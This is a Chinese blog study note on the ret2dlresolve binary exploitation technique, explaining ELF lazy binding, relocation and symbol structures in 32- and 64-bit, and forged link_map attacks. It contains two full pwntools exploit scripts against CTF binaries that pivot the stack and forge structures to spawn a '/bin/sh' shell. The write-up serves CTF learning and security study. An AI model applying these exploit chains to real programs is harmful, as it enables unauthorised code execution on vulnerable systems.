---
layout:     post
title:      学习ret2dlresolve
subtitle:   笔记
date:       2020-03-18
author:     X1ng
header-img: ret2dlresolve.jpg
catalog: true
tags:

- 学习笔记
- pwn

---

# ret2dlresolve

个人感觉，首次接触ret2dlresolve时最大的问题就是各种相关重定位的结构体太多，很多时候看着一个名字好像刚刚看过但是又想不起来这是个啥，而且在构造这些结构体的时候经常会搞不清楚某个结构体到底有多少字节，所以我把之前搞不太清楚的一些地方列了出来（很多似乎都是很基础的东西，但我实在是太菜了or2）

首先要了解一下结构体里各种类型的大小，否则在构造结构体的时候根本不知道结构体中各成员的大小

可以在 [glibc](https://code.woboq.org/userspace/glibc/)/[elf](https://code.woboq.org/userspace/glibc/elf/)/[elf.h](https://code.woboq.org/userspace/glibc/elf/elf.h.html)查看相关的类型定义

![宏定义](https://tva1.sinaimg.cn/large/00831rSTgy1gd9aspsysqj30zx0u0tc6.jpg)

重点关注`Elf32_Half`,`Elf64_Half`,`Elf32_Word`,`Elf64_Word`，`Elf32_Addr`,`Elf64_Addr`,`Elf32_Section`,`Elf64_Section`这几个本篇比较常见的类型

还有就是一些长的很像的结构体，很容易混淆，只能多看几遍，逐渐理清各种结构体的关系

### 预备知识

#### 延迟绑定



> 程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。



让我们看看在程序执行执行call read@plt的时候到底发生了什么

got表分为.got表和.got.plt表，`.got`用来保存全局变量的引用地址。`.got.plt`用来保存函数引用的地址。

在第一次调用read之前

`.plt`：

```
---------------------------------
PLT0：
    push *(GOT+4)           		//模块名压栈
    jmp *(GOT+8)            		//跳转到_dl_runtime_resolve()
---------------------------------
            ... ...
---------------------------------
read@plt:
    jmp *(read@got)     		//首先跳转到该函数的GOT表项，判断是否是第一次调用 链接
    push n                      //压入 需要地址绑定的符号 在重定位表.rel.plt中的下标（reloc_arg）
    jmp PLT0                    //跳转到 PLT0
---------------------------------
```

`.got.plt`：

```
---------------------------------
.dynamic段地址
---------------------------------
链接器的标识信息（link_map）
---------------------------------
_dl_runtime_resolve()地址
---------------------------------

            ... ...
            
---------------------------------
read@got:
    read@plt+6                  //代指plt表中的"push n"这句
---------------------------------
```

当我们第一次调用read时，其对应的GOT表里并没有存放read的真实地址，而是`jmp *(read@got)`的下一条指令地址。

所以实际上程序第一次执行`jmp *(read@got)`的时候就相当于`nop`

程序继续执行，将该函数在重定位表`.rel.plt`中的下标和链接器的标识信息相继压栈，再跳转到执行_dl_runtime_resolve()

> 以上指令相当于执行了`_dl_runtime_resolve(link_map, reloc_arg)`，该函数会完成符号的解析，即将真实的write函数地址写入其GOT条目中，随后把控制权交给write函数。

### 32bit重定位流程

> 通过阅读_dl_fixup源码可以总结出一般的函数重定向流程可简略如下：
>
> 1.通过struct link_map获得.dynsym、.dynstr、.rel.plt地址
>
> 2.通过reloc_arg+.rel.plt地址取得函数对应的Elf32_Rel指针，记作reloc
>
> 3.通过reloc->r_info和.dynsym地址取得函数对应的Elf32_Sym指针，记作sym
>
> 4.检查r_info最低位是否为7
>
> 5.检查(sym->st_other)&0x03是否为0
>
> 6.通过strtab+sym->st_name获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数

[_dl_fixup源码](https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#82)

（其中reloc_arg在32bit为偏移，64bit为下标）



下面以调用read函数作为演示

在进入_dl_runtime_resolve()后，程序先在`.dynamic`中找到JMPREL段

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopmmrbwhj314y0qg0zp.jpg)

`.dynamic`对应结构体为

```c
typedef struct
{
 Elf32_Sword  d_tag;      /*Dynamic entry type*/
 union
  {
   Elf32_Word d_val;      /*Integer value */
   Elf32_Addr d_ptr;      /*Address value */
  } d_un;
} Elf32_Dyn;
```

其中Tag对应着每个节，比如`JMPREL`对应着`.rel.plt`

再根据`reloc_arg` 在JMPREL段相应偏移处找到read的Elf32_Rel结构体

`.rel.plt`节是用于函数重定位，`.rel.dyn`节是用于变量重定位

`JMPREL`：

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopnfkfskj314u0ea79o.jpg)

所对应的结构体为

```c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
#define ELF32_R_SYM(val) ((val) >> 8) 
#define ELF32_R_TYPE(val) ((val) & 0xff)
```

所以这里read的`r_offset`为0x0804a00c，`r_info`为0x00000107

（`.dynsym`节包含了动态链接符号表  `.dynstr`节包含了动态链接的字符串）

根据定义 有

symbol index：`ELF32_R_SYM(r_info) = 0x107 >> 8 = 1` 	也就是read函数在`.dynsym`中的索引为1

type：`ELF32_R_TYPE(r_info)=7`	对应于R_386_JUMP_SLOT（程序会检查r_info最低位是否为7）

接下来到`.dynsym`中根据`st_name`确定字符串"read"的地址

`.dynsym`：

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopnvtvzvj315o0df41l.jpg)

这段内存为

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopocsxtij315o0e3tdk.jpg)

注意上图为小端序表示，即

```
0x80481e8: 0x00000025 0x00000000 0x00000000 0x00000012
```

对应结构体为

```c
typedef struct
{
  Elf32_Word    st_name;   /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;  /* Symbol value */
  Elf32_Word    st_size;   /* Symbol size */
  unsigned char st_info;   /* Symbol type and binding */
  unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
  Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;
```

`st_name`是函数名称在  `.dynstr`中的偏移，程序根据偏移找到函数名称的字符串，也就是"read"

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopot0w46j31140bmq6q.jpg)

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopp266blj30s002474d.jpg)

再进行查找，找到后将函数真实地址保存在`.got.plt`的对应表项中，然后调用这个函数

另附上取自[veritas501's blog](https://www.yuque.com/ut5nme/hvgids/veritas501.space/2017/10/07/ret2dl_resolve学习笔记/#more)的流程图



![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geoppdzlldj315o0kmtcn.jpg)



![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geoppzhxovj315o0sutkc.jpg)



### 32bit漏洞利用

> 1.控制`eip`为PLT[0]的地址，只需传递一个`index_arg`参数
>
> 2.控制`index_arg`的大小，使`reloc`的位置落在可控地址内
>
> 3.伪造`reloc`的内容，使`sym`落在可控地址内
>
> 4.伪造`sym`的内容，使`name`落在可控地址内
>
> 5.伪造`name`为任意库函数，如`system`

以[Hgame2020 week4的ROP5](https://pan.baidu.com/s/1lt9BZz7uzdpK5xY8c3pT0g)为例

提取码: c6g2

例行检查

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopqd9uc8j30ni05waas.jpg)

ida打开

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopqochxaj315o0q0783.jpg)

关闭了标准输出和标准错误，不能泄漏libc，且存在一处溢出

利用ret2dl_resolve

大致思路先进行栈迁移，让esp指向bss段，然后在bss段构造`index_offset`使其指向我们构造的`fake_reloc`，然后让返回地址直接指向PLT0,再构造特定的`r_info`让程序找到我们构造的`fake_sym`，从而控制`st_name`

需要注意的是，由于我们一般把这个构造的`.dynsym`表项写在`.bss`，所以fake符号表的偏移（`reloc->r_info`的前三个字节是符号表的偏移）太大，vernum这个数组就有可能越界，ndx可能为任何值，version处可能出现错误导致程序终止。

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopr5lh3ij30tu05w75a.jpg)

要让version为NULL，可以让ndx为0

**PKFXXXX**：“运气好的话，即使偏移很大，说不定version也能为NULL  运气游戏23333”

下面是我参考了参考资料里师傅们的脚本写的辣鸡脚本

```python
#!/usr/bin/env python2

# -*- coding: utf-8 -*-

from pwn import *

elf = ELF('ROP5')
offset = 72
read_plt = elf.plt['read']

ppp_ret = 0x080485d9                # ROPgadget --binary ROP5 --only "pop|ret" #esi edi ebp

pop_ebp_ret = 0x080485db 
leave_ret = 0x08048458              # ROPgadget --binary ROP5 --only "leave|ret"


cmd = "/bin/sh"
plt_0 = 0x08048380                  # objdump -d -j .plt ROP5

rel_plt = 0x08048330                # objdump -s -j .rel.plt ROP5


stack_size = 0x200
bss_addr = elf.bss() 
base_stage = bss_addr + stack_size

puts_got = elf.got['puts'] 

dynsym = 0x080481d8                 #objdump -d -j .dynsym ROP5

dynstr = 0x08048278                 #objdump -d -j .dynstr ROP5


#################################################

index_offset = (base_stage + 28) - rel_plt
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
#################################################


versym = elf.dynamic_value_by_tag("DT_VERSYM")

while True:                                                                 #通过改变base_stage的方式来调整偏移，让ndx为0
  
    fake_ndx = u16(elf.read(versym+index_dynsym*2,2))                       #ndx定义时与0x7fff按位与运算，故ndx应该为两个字节
    
    if fake_ndx != 0:
        base_stage += 0x10
        #################################################
        
        index_offset = (base_stage + 28) - rel_plt
        fake_sym_addr = base_stage + 36
        fake_sym_addr = fake_sym_addr + align
        index_dynsym = (fake_sym_addr - dynsym) / 0x10
        #################################################
        
        continue
    else :
        break 


r = process('./ROP5')
#r  = remote("47.103.214.163", 20700)

#gdb.attach(r,'b *0x0804855B')



r.recvuntil('Are you the LEVEL5?\n')
payload = 'A' * offset
payload += p32(read_plt)                    # 读100个字节到base_stage

payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)             
payload += p32(base_stage)
payload += p32(leave_ret)               		#进行栈迁移

payload += 'a'*152
r.send(payload)


r_info = (index_dynsym << 8) | 0x7          #readelf -r ROP5

fake_reloc = p32(puts_got) + p32(r_info) 

st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)
                                        		#p8(0) 绕过判断(sym->st_other)&0x03是否为0
  
payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80) 
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc                      # (base_stage+28)的位置

payload2 += 'B' * align
payload2 += fake_sym                       	# (base_stage+36)的位置

payload2 += "system\x00"
payload2 += 'C' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))


r.sendline(payload2)

r.interactive()
```

运行脚本即可getshell

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1geopros22cj30te0ak40i.jpg)

之后进行输出重定位后即可`cat flag`，这里不再赘述

感谢**@PKFXXXX**  关于ndx（即vernum数组元素）为2字节的解释

### 64bit重定位流程

大体与32bit下差不多，但是一些结构体发生了改变

Elf32_Rel升级为Elf64_Rela(注意结构体大小的改变)

```c
typedef struct
{
 Elf64_Addr  r_offset;    /* Address */
 Elf64_Xword  r_info;      /* Relocation type and symbol index */
 Elf64_Sxword  r_addend;    /* Addend */
} Elf64_Rela;
```

Elf32_R_SYM、Elf32_R_TYPE定义升级为Elf64_R_SYM、Elf64_R_TYPE

```c
#define ELF64_R_SYM(i)      ((i) >> 32)
#define ELF64_R_TYPE(i)      ((i) & 0xffffffff)
```

Elf32_Sym升级为Elf64_Sym

```c
typedef struct
{
 Elf64_Word  st_name;    		/* Symbol name (string tbl index) */
 unsigned char  st_info;    /* Symbol type and binding */
 unsigned char st_other;    /* Symbol visibility */
 Elf64_Section  st_shndx;   /* Section index */
 Elf64_Addr  st_value;    	/* Symbol value */
 Elf64_Xword  st_size;    	/* Symbol size */
} Elf64_Sym;
```

所以64bit下，在进入_dl_runtime_resolve()后，通过`reloc_arg`(32bit为偏移，64bit为下标)取得函数对应的Elf64_Rela指针（reloc）,然后通过`reloc->r_info`和`.dynsym`地址取得函数对应的Elf64_Sym指针，再通过`st_name`和`.dynstr`取得函数名称，寻找函数真实地址，找到后将其保存在`.got.plt`的对应表项中，然后调用这个函数

再贴一张取自[看雪论坛ninebianbian的帖子](https://bbs.pediy.com/thread-228580.htm)的图

![流程](https://tva1.sinaimg.cn/large/00831rSTgy1gd9j2h11ptj30la0lfwgf.jpg)

### 64bit漏洞利用

64bit有两种漏洞利用方式

#### 1、构造结构体（需要leak&overwrite）

与32bit下基本一致，只是一些结构体的大小和成员不同

但是需要注意的是绕过version的方法不能再用用32bit的方法了

问题就在于这个函数

![源码](https://tva1.sinaimg.cn/large/00831rSTgy1gda4gqlcizj30vo09wq3t.jpg)

> 程序会先取.dynamic中的DT_VERSYM所在的地址判断是否为0。
> 接着取DT_VERSYM结构体的d_ptr赋值给指针变量vernum。
> 将(reloc->r_info)>>32作为vernum下标取值。

而我们之前说的取得函数所对应的Elf64_Sym过程中，程序也是将`(reloc->r_info)>>32`作为下标，也就是说`(reloc->r_info)>>32`同时用作vernum下标取值和Elf64_Sym下标取值

在64位下,程序一般分配了0x400000-0x401000,0x600000-0x601000,0x601000-0x602000这三个段，VERSYM在0x400000-0x401000，而我们一般把我们伪造的结构体写在0x601000-0x602000这个rw段上,这样r_info必然很大，在64bit下`(reloc->r_info)>>32`作为vernum下标取值时十分容易访问到0x400000和0x600000之间的不可读区域

所以我们需要利用`if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)`绕过，`l->l_info[VERSYMIDX (DT_VERSYM)]`对应着link_map+0x1c8(32下是link_map+0xe4),方法为覆盖 (link_map + 0x1c8) 处为 NULL,但是link_map是在ld.so上的,因此我们需要leak,之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造`reloc_arg`来进行攻击。

由于跟32bit十分相似，且需要leak，略显鸡肋，这里就不再贴脚本了，可以参考上面师傅们的博客

#### 2、伪造link map（需要libc版本）

看这部分完整的if-else源码

![源码](https://tva1.sinaimg.cn/large/00831rSTgy1gdacqr4y5cj30u01g47f2.jpg)

发现如果`if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)`不成立，即程序进入下面else流程时，程序通过DL_FIXUP_MAKE_VALUE计算出函数的真实地址

![源码](https://tva1.sinaimg.cn/large/00831rSTgy1gdadcrmce4j30we03mmxf.jpg)

查看相关的宏定义

![源码](https://tva1.sinaimg.cn/large/00831rSTgy1gdad8twwo7j311y04i74m.jpg)

![源码](https://tva1.sinaimg.cn/large/00831rSTgy1gdad9g4swhj30v001aglg.jpg)

也就是说，如果`(sym->st_other)&0x03`被设置为非0，进入else语句，并让`l->l_addr `+ `sym->st_value`指向system语句即可进入system函数。

`sym`是通过linkmap解析出来的,因此`sym->st_value`可以伪造成任意值,而`l->l_addr`是linkmap的第一个元素,8字节

我们来回忆一下`Elf64_Sym`的结构

```
typedef struct
{
 Elf64_Word  st_name;    		/* Symbol name (string tbl index) */
 unsigned char  st_info;    /* Symbol type and binding */
 unsigned char st_other;    /* Symbol visibility */
 Elf64_Section  st_shndx;   /* Section index */
 Elf64_Addr  st_value;    	/* Symbol value */
 Elf64_Xword  st_size;    	/* Symbol size */
} Elf64_Sym;
```

如果我们伪造linkmap，我们可以让"这个函数对应的sym" = "这个got表地址-8"，也就是让`sym->st_value`落在某个已经解析了的函数got表上，而`l->l_addr`设置为system函数和这个已经解析的函数的偏移值，所以用这个方法前提是我们要知道libc版本，从而知道system函数和这个已经解析的函数的偏移值，假设这个已经解析的函数是`__libc_start_main`，也就是要知道`system`和`__libc_start_main`之间的相对偏移

（只要能找到一个glibc上的指针,能够计算其与`system`的相对偏移应该都是可以的）

但是这里需要注意的是为了保证`(sym->st_other)&0x03 != 0`，也就是`(*(sym+5))&0x03 != 0`,一般需要确保"与`sym->st_value`对应的got表项"的上一项got表项已经被解析过，此时`sym->st_other`一般为0x7f,才能保证`(sym->st_other)&0x03 != 0`，如果你找的"与`sym->st_value`对应的got表项"的上一项并不存在，那也要让`*(sym+5))&0x03 != 0`（这里的sym=对应got表地址-8）

举个例子，假设这个"与`sym->st_value`对应的got表项"即是`__libc_start_main`，我们需要保证`__libc_start_main`的上一项got表项已被解析，确保`(sym->st_other)&0x03 != 0`成立

![流程图](https://tva1.sinaimg.cn/large/00831rSTgy1gdaetm2lgpj30nc0o6gm7.jpg)

知道了原理以后就要伪造linkmap了

> 我们还需要控制symtab和reloc->r_info,因此我们还要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针，另外strtab必须是个可读的地址，因此我们还需要伪造位于link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_arg作为0来进行构造。
>
> 总的来说要满足以下几个条件:
>
> 1.link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读
> 2.DT_SYMTAB结构体中的d_ptr即sym，(*(sym+5))&0x03 != 0
> 3.(reloc->r_info)&0xff == 7
> 4.rel_addr = l->addr + reloc->r_offset即原先需要修改的got表地址有可写权限
> 5.l->l_addr + sym->st_value 为system的地址

以[XMAN 2016-LEVEL3_64](https://pan.baidu.com/s/1P_OITvGx6NYiZnFR3pAS2Q)为例

提取码: dcwr

![ida](https://tva1.sinaimg.cn/large/00831rSTgy1gdam0fpsusj31k50u0wjs.jpg)

思路就是通过rop制造一次任意地址写的机会，然后将伪造的linkmap写在`.bss`上，转移栈后执行`_dl_runtime_resolve(link_map, reloc_arg)`

首先伪造link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针、link_map+0x68的DT_STRTAB指针和伪造.dynamic中的DT_SYMTAB结构体、DT_JMPREL结构体和DT_STRTAB结构体（DT_STRTAB只需要是一段可读的内存，因此只要位于link_map+0x68的DT_STRTAB指针指向一段可读的内存就行，这里选择了linkmap的首地址）

![图例1](https://tva1.sinaimg.cn/large/00831rSTgy1gdakssdar5j30kc1bnadt.jpg)

然后伪造函数所对应的Elf64_Rela结构体和Elf64_Sym

![图例2](https://tva1.sinaimg.cn/large/00831rSTgy1gdammt8g9rj30u01m5100.jpg)

最后找个地方放"/bin/sh"

![图例3](https://tva1.sinaimg.cn/large/00831rSTgy1gdamqxihvkj30sw1oa0zu.jpg)

需要注意的是，构造的`fake_Elf64_rela`的时候，`r_offset`正常情况下应该是用于存放 `.got` 与 `l->addr` 之间的距离，而在我们构造的linkmap中也应该是 一个可写的地址（如一个bss段上的地址）与`l_addr`的距离

贴一个加了一些注释的[看雪论坛g3n3rous](https://bbs.pediy.com/thread-253833.htm)师傅的完整脚本

```python
#coding:utf-8
 
from pwn import *
context.log_level = 'debug'
elf = ELF('./level3_x64')
libc = elf.libc
p = process('./level3_x64')
#gdb.attach(p,'b*0x400619')

'''
typedef struct

{

    Elf64_Word    st_name;        /* Symbol name (string tbl index) */
    
      unsigned char    st_info;    /* Symbol type and binding */        
      
      unsigned char st_other;        /* Symbol visibility */            
      
      Elf64_Section    st_shndx;    /* Section index */              
      
      Elf64_Addr    st_value;        /* Symbol value */             
      
      Elf64_Xword    st_size;        /* Symbol size */              
      
}Elf64_Sym;
 
typedef struct           

{

  Elf64_Addr    r_offset;        /* Address */             
  
  Elf64_Xword    r_info;            /* Relocation type and symbol index */
  
  Elf64_Sxword    r_addend;        /* Addend */                          
  
}Elf64_Rela;
 
 
typedef struct          

{

  Elf64_Sxword    d_tag;            /* Dynamic entry type */
  
  union
  
    {
    
      Elf64_Xword d_val;        /* Integer value */
      
      Elf64_Addr d_ptr;            /* Address value */
      
    } d_un;
    
}Elf64_Dyn;
'''

universal_gadget1 = 0x4006AA    #ret2__libc_csu_init
  
universal_gadget2 = 0x400690
 
Elf64_Sym_len = 0x18 
Elf64_Rela_len = 0x18
write_addr = 0x600ad0 			#任意可写地址，用于转移栈且写入fake_link_map(要确保所有的内容的在可访问地址)
  
link_map_addr = write_addr+0x18	
rbp = write_addr-8
pop_rdi_ret = 0x4006b3
leave = 0x400618
main = 0x4005E6
 
#fake_Elf64_Dyn_STR_addr = l+0x68  				
  
#fake_Elf64_Dyn_SYM_addr = l+0x70  
  
#fake_Elf64_Dyn_JMPREL_addr = l+0xf8
  
 
l_addr = libc.sym['system'] - libc.sym['__libc_start_main']
#l->l_addr + sym->st_value
  
# value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
  
 
def fake_link_map_gen(link_map_addr,l_addr,st_value):
    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + 0x18 #指向fake_Elf64_Dyn_JMPREL
  
    fake_Elf64_Dyn_SYM_addr = link_map_addr + 8
    fake_Elf64_Dyn_STR_addr = link_map_addr
    
    fake_Elf64_Dyn_JMPREL = p64(0) + p64(link_map_addr+0x28)
    fake_Elf64_Dyn_SYM = p64(0) + p64(st_value-8)
    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(7) + p64(0)
 
    fake_link_map = p64(l_addr)            #0x8
  
    fake_link_map += fake_Elf64_Dyn_SYM    #0x10
  
    fake_link_map += fake_Elf64_Dyn_JMPREL #0x10
  
    fake_link_map += fake_Elf64_rela       #0x18
  
    fake_link_map += '\x00'*0x28
    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) #link_map_addr + 0x68
  
    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) #link_map_addr + 0x70
  
    fake_link_map += '/bin/sh\x00'.ljust(0x80,'\x00')
    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)
    return fake_link_map

fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got['__libc_start_main'])
 
payload = 'a'*0x80
payload += p64(rbp)
payload += p64(universal_gadget1)
payload += p64(0)  #pop rbx
  
payload += p64(1)  #pop rbp
  
payload += p64(elf.got['read'])  #pop r12
  
payload += p64(len(fake_link_map)+0x18)		#pop r13
  
payload += p64(write_addr)  #pop r14
  
payload += p64(0)           #pop r15
  
payload += p64(universal_gadget2)  #ret
  
payload += p64(0)*7
payload += p64(main)
 
p.sendafter('Input:\n',payload.ljust(0x200,'\x00'))
sleep(1)
 
fake_info = p64(0x4004A6)        #ret #_dl_runtime_resolve(link_map, reloc_arg)
  
fake_info += p64(link_map_addr)
fake_info += p64(0)							 #reloc_arg为0
  
fake_info += fake_link_map
p.send(fake_info)
 
payload = 'a'*0x80+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+0x78)+p64(leave)
#stack pivot,进入函数重定向
  
p.sendafter('Input:\n',payload)
 
p.interactive()
```



>参考资料：
>
>参考资料：
>
>[BruceFan's Blog](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)
>
>[veritas501's Blog](https://www.yuque.com/ut5nme/hvgids/veritas501.space/2017/10/07/ret2dl_resolve学习笔记/#more)
>
>[看雪论坛g3n3rous的帖子](https://bbs.pediy.com/thread-253833.htm)
>
>[看雪论坛ninebianbian的帖子](https://bbs.pediy.com/thread-228580.htm)
>
>[ddaa's Blog](https://ddaa.tw/hitcon_pwn_200_blinkroot.html)
